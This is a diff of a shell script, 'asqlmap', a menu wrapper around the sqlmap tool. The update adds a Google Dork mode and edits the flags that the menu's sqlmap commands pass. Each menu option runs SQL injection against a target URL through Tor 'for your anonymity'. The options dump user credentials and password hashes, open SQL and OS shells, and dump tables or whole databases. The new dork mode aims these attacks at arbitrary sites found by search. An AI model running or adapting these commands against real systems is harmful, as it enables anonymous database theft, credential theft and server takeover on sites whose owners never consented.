@@ -1,19 +1,19 @@
 #!/bin/sh
 	clear
-	ver="0.9.7"
+	ver="0.9.8"
 	printf "**		Automated sqlmap (asqlmap) for BackBox v. $ver 	  **\n"
 	printf "   		           developed by Gualty    \n"
 	printf "   		         http://github.com/Gualty    \n"
 	printf "\n\nEach operation will be performed using the --tor flag for your anonymity"
 	printf "\n		** Check that TOR and Polipo are running **\n"
-	
+
 	#Check if sqlmap is installed on the system
 	sqlmapexist=$(which sqlmap)
 	if [ -z "$sqlmapexist" ]; then
 		echo "ERROR: sqlmap is not installed!\n\n Install it before run sqlmap"
 		exit 0
 	fi
-	
+
 	#Variables from the command line
 	l="1"
 	r="1"
@@ -29,9 +29,10 @@
 	if [ "$4" = "-l" ]; then
 		l=$5
 	fi
-	
+
 	#Google Dork
 	case $1 in
+	-g) echo "\nATTENTION: Google Dork search will not use Tor, so you will not be anonymous.\nPress ENTER to continue at your own risk or CTRL+C to close asqlmap\n";read tasto;sqlmap -g $2 --random-agent -b --dbs --table --eta --cleanup  --identify-waf;echo "Google Dork search done\n\nPress any key to close asqlmap";read tasto;exit;;
 	esac
 	#Check if the user specified an URL if is not a Google Dork search
 	if [ -z "$1" ]
@@ -69,13 +70,13 @@
 	read choice
 	# Execute the right operation based on the choice of the user
 	case "$choice" in
-		1) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dbs --table --tor --check-tor --eta --cleanup --check-waf --identify-waf --exclude-sysdbs;echo "Vulnerability check done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
-		2) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --users --passwords --privileges --tor --check-tor --eta --cleanup --check-waf --identify-waf --exclude-sysdbs;echo "\nRetrieving credentials and privileges done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
-		3) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --sql-shell --tor --check-tor --eta --cleanup --check-waf --identify-waf --exclude-sysdbs;echo "\nSQL Shell closed\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
-		4) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --os-shell --tor --check-tor --eta --cleanup --check-waf --identify-waf --exclude-sysdbs;echo "\nOS Shell closed\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
-		5) echo "\nTable name: "; read tabella; sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dump -T $tabella --tor --check-tor --eta --cleanup --check-waf --identify-waf --exclude-sysdbs;echo "\nDump of the table '$tabella' done\n\nPress any key to continuee";read tasto;$0 $1 $2 $3 $4 $5;;
-		6) echo "\nDatabase name: "; read database; sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dump -D $database --tor --check-tor --eta --cleanup --check-waf --identify-waf --exclude-sysdbs;echo "\nDump of the database '$database' done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
-		7) sqlmap -u $1 --random-agent  --level=$l --risk=$r -b --dump-all --tor --check-tor --eta --cleanup --check-waf --identify-waf --exclude-sysdbs;echo "\nDump of all databases done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		1) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dbs --table --tor  --eta --cleanup  --identify-waf --exclude-sysdbs;echo "Vulnerability check done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		2) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --users --passwords --privileges --tor  --eta --cleanup  --identify-waf --exclude-sysdbs;echo "\nRetrieving credentials and privileges done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		3) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --sql-shell --tor  --eta --cleanup  --identify-waf --exclude-sysdbs;echo "\nSQL Shell closed\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		4) sqlmap -u $1 --random-agent --level=$l --risk=$r -b --os-shell --tor  --eta --cleanup  --identify-waf --exclude-sysdbs;echo "\nOS Shell closed\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		5) echo "\nTable name: "; read tabella; sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dump -T $tabella --tor  --eta --cleanup  --identify-waf --exclude-sysdbs;echo "\nDump of the table '$tabella' done\n\nPress any key to continuee";read tasto;$0 $1 $2 $3 $4 $5;;
+		6) echo "\nDatabase name: "; read database; sqlmap -u $1 --random-agent --level=$l --risk=$r -b --dump -D $database --tor  --eta --cleanup  --identify-waf --exclude-sysdbs;echo "\nDump of the database '$database' done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
+		7) sqlmap -u $1 --random-agent  --level=$l --risk=$r -b --dump-all --tor  --eta --cleanup  --identify-waf --exclude-sysdbs;echo "\nDump of all databases done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
 		8) git pull; echo "\nasqlmap updated\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
 		9) sudo sqlmap --update; echo "\nsqlmap updated\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
 		0) echo "\nBye bye =)\n"; exit 0;;
